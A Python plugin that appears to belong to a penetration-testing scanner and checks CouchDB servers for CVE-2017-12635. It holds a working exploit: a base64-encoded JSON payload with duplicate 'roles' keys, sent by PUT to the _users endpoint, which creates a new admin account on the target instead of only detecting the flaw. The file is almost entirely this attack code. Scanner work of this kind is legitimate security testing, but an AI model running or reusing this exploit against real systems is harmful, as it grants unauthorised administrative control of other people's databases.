import base64
from lib.poc.dummy import *


async def couchdb_rest_api_found(ip, port, url):
    try:
        r = await http_client(ip, port).get(url, timeout=10)
        return r.status_code == 200 and '{"couchdb":"' in r.text
    except Exception as e:
        pass


# test if CouchDB is vulnerable to CVE-2017-12635
async def test_couchdb_cve_2017_12635(ip, port, url):
    try:
        rnd_user_name = random_str(6, False)
        url = url + '/_users/org.couchdb.user:' + rnd_user_name

        payload = str(base64.b64decode(
            'ewogICJ0eXBlIjogInVzZXIiLAogICJuYW1lIjogInZ1bGh1YiIsCiAgInJvbGVzIjogWyJfYWRtaW4iXSwKICAicm9sZXMiOi'
            'BbXSwKICAicGFzc3dvcmQiOiAidnVsaHViIgp9'), ).replace('vulhub', rnd_user_name)

        r = await http_client(ip, port).put(url, data=payload, headers={'Content-Type': 'application/json'}, timeout=10)

        if r.status_code == 201 and '{"ok":true' in r.text:
            return rnd_user_name, payload
    except Exception as e:
        debug(e)


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if port != 5984:
        return
    url = '{}://{}:{}'.format(service, ip, port)

    try:
        if await couchdb_rest_api_found(ip, port, url):
            pri_esc_found = await test_couchdb_cve_2017_12635(ip, port, url)
            if pri_esc_found:
                ret = {
                    'alert_group': 'CouchDB Remote Privilege Escalation CVE_2017_12635',
                    'affects': '{}://{}:{}'.format(service, ip, port),
                    'details': 'CouchDB Remote Privilege Escalation\n'
                               'PUT /_users/org.couchdb.user:{}\npayload:{}'.format(pri_esc_found[0], pri_esc_found[1])
                }
                return ret

            ret = {
                'alert_group': 'CouchDB REST API',
                'affects': '{}://{}:{}'.format(service, ip, port),
                'details': 'CouchDB REST API is accessible on port 5984'
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 5984, 'HTTP', True, task_msg={})
    run_plugin_test(scan)
